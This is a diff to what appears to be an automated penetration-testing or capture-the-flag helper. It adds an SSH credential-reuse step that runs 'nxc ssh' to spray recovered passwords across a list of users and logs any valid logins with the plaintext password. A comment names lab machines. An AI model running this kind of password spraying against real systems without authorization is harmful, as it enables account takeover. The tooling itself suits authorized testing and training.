@@ -847,6 +847,8 @@ def _run_cred_reuse(
     """
     creds_file = ws.loot_dir / "creds_found.txt"
     users_file = ws.loot_dir / "users.txt"
+    if not creds_file.exists() or not users_file.exists():
+        return
     passwords = [l.strip() for l in creds_file.read_text().splitlines() if l.strip()]
     if not passwords:
         return
@@ -919,6 +921,30 @@ def _run_cred_reuse(
                         f"`evil-winrm -i {ip} -u {hit_user} -p {password}`"
                     )
                     _save_valid_cred(ws, line.strip(), password, "WinRM")
+
+        # SSH — the cross-protocol surface. A secret recovered on one protocol
+        # (cracked hash, IKE PSK, leaked literal) is very often reused as the SSH
+        # password (Blocky, Expressway). nxc ssh prints "[+] user:pass" on a hit.
+        if 22 in open_tcp:
+            cmd3 = [
+                "nxc", "ssh", ip,
+                "-u", user_arg, "-p", password,
+                "--continue-on-success",
+            ]
+            out3 = runner.run(cmd3, f"cred_ssh_{re.sub(r'[^a-z0-9]', '_', password.lower())[:16]}", timeout=120)
+            findings.cmd(f"nxc ssh {ip} -u [users:{len(targets)}] -p *** --continue-on-success")
+            for line in out3.splitlines():
+                if "[+]" not in line:
+                    continue
+                m = re.search(r"\[\+\]\s+([^\s:]+):", line)
+                hit_user = m.group(1) if m else "USER"
+                shell = "Shell access!" in line or "Pwn3d!" in line
+                tag = " (shell!)" if shell else ""
+                findings.bullet(f"**Valid SSH credential{tag}:** `{line.strip()}`")
+                findings.add_summary(
+                    f"**SSH access** as `{hit_user}` — `ssh {hit_user}@{ip}` (password: `{password}`)"
+                )
+                ws.add_valid_cred(hit_user, password, "SSH")
 
         os.unlink(user_arg)
 
